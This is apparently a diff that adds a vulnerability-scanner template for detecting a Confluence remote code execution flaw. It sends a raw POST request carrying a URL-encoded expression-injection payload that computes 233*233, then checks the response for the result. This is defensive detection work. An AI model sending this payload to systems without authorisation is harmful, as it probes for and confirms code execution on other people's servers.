@@ -1,0 +1,35 @@
+id: confluence-rce-createpage-entervariables
+
+info:
+  name: confluence-rce-createpage-entervariables
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a vulnerability in a product via a specific POST request.
+ 
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /pages/createpage-entervariables.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 47
+
+        queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 200
+          - 403
